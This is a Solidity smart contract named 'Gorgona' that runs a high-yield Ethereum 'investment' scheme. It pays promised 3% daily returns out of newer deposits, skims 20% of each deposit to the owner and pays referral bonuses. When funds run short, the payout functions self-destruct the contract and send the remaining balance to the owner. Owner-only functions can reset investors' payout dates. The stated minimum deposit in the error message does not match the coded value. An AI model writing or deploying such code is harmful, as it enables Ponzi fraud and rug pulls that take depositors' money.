pragma solidity ^0.4.24;

contract Gorgona {
    address public owner;

    uint constant PAYOUT_PER_INVESTOR_INTERVAL = 10 minutes;
    uint constant INTEREST = 3;
    uint private PAYOUT_CUMULATIVE_INTERVAL = 10 minutes;
    uint private MINIMUM_INVEST = 10000000000000000 wei;

    uint depositAmount;
    uint investorCount;
    uint public payoutDate;

    struct investor
    {
        uint id;
        uint deposit;
        uint deposits;
        uint date;
        address referrer;
    }

    address[] public addresses;

    mapping(address => investor) public investors;

    event Invest(address addr, uint amount);
    event PayoutCumulative(uint amount, uint txs);
    event PayoutSelf(address addr, uint amount);
    event RefFee(address addr, uint amount);
    event Cashback(address addr, uint amount);

    modifier onlyOwner {if (msg.sender == owner) _;}

    constructor() public {
        owner = msg.sender;
        addresses.length = 1;
        payoutDate = now;
    }

    function() payable public {
        if (msg.value == 0) {
            return;
        }

        require(msg.value >= MINIMUM_INVEST, "Too small amount, minimum 0.001 ether");

        investor storage user = investors[msg.sender];

        if (user.id == 0) {
            user.id = addresses.length;
            addresses.push(msg.sender);
            addresses.length++;
            investorCount ++;

            // referrer
            address referrer = bytesToAddress(msg.data);
            if (investors[referrer].deposit > 0 && referrer != msg.sender) {
                user.referrer = referrer;
            }
        }

        // save investor
        user.deposit += msg.value;
        user.deposits += 1;
        user.date = now;

        emit Invest(msg.sender, msg.value);
        depositAmount += msg.value;

        // project fee
        owner.transfer(msg.value / 5);

        // referrer commission for all deposits
        if (user.referrer > 0x0) {
            uint bonusAmount = (msg.value / 100) * INTEREST;
            user.referrer.transfer(bonusAmount);
            emit RefFee(user.referrer, bonusAmount);

            // cashback only for first deposit
            if (user.deposits == 1) {
                msg.sender.transfer(bonusAmount);
                emit Cashback(msg.sender, bonusAmount);
            }
        }
    }

    function payout(uint limit) public
    {
        require(now >= payoutDate + PAYOUT_CUMULATIVE_INTERVAL, "too fast payout request");

        uint investorsPayout;
        uint txs;
        uint amount;

        for (uint idx = addresses.length - 1; --idx >= 1;)
        {
            address addr = addresses[idx];
            if (investors[addr].date + 24 hours > now) {
                continue;
            }

            amount = getInvestorUnPaidAmount(addr);
            investors[addr].date = now;

            if (address(this).balance < amount) {
                selfdestruct(owner);
                return;
            }

            addr.transfer(amount);

            investorsPayout += amount;
            if (++txs >= limit) {
                break;
            }
        }

        payoutDate = now;
        emit PayoutCumulative(investorsPayout, txs);
    }

    function payoutSelf(address addr) public
    {
        require(addr == msg.sender, "You need specify your ETH address");

        require(investors[addr].deposit > 0, "deposit not found");
        require(now >= investors[addr].date + PAYOUT_PER_INVESTOR_INTERVAL, "too fast payment required");

        uint amount = getInvestorUnPaidAmount(addr);
        require(amount >= 1 finney, "too small unpaid amount");

        investors[addr].date = now;
        if (address(this).balance < amount) {
            selfdestruct(owner);
            return;
        }

        addr.transfer(amount);

        emit PayoutSelf(addr, amount);
    }

    function getInvestorDeposit(address addr) public view returns (uint) {
        return investors[addr].deposit;
    }

    function getInvestorCount() public view returns (uint) {
        return investorCount;
    }

    function getDepositAmount() public view returns (uint) {
        return depositAmount;
    }

    function getInvestorDatePayout(address addr) public view returns (uint) {
        return investors[addr].date;
    }

    function getPayoutCumulativeInterval() public view returns (uint)
    {
        return PAYOUT_CUMULATIVE_INTERVAL;
    }

    function setDatePayout(address addr, uint date) onlyOwner public
    {
        investors[addr].date = date;
    }

    function setPayoutCumulativeInterval(uint interval) onlyOwner public
    {
        PAYOUT_CUMULATIVE_INTERVAL = interval;
    }

    function getInvestorUnPaidAmount(address addr) public view returns (uint)
    {
        return (((investors[addr].deposit / 100) * INTEREST) / 100) * ((now - investors[addr].date) * 100) / 1 days;
    }

    function bytesToAddress(bytes bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}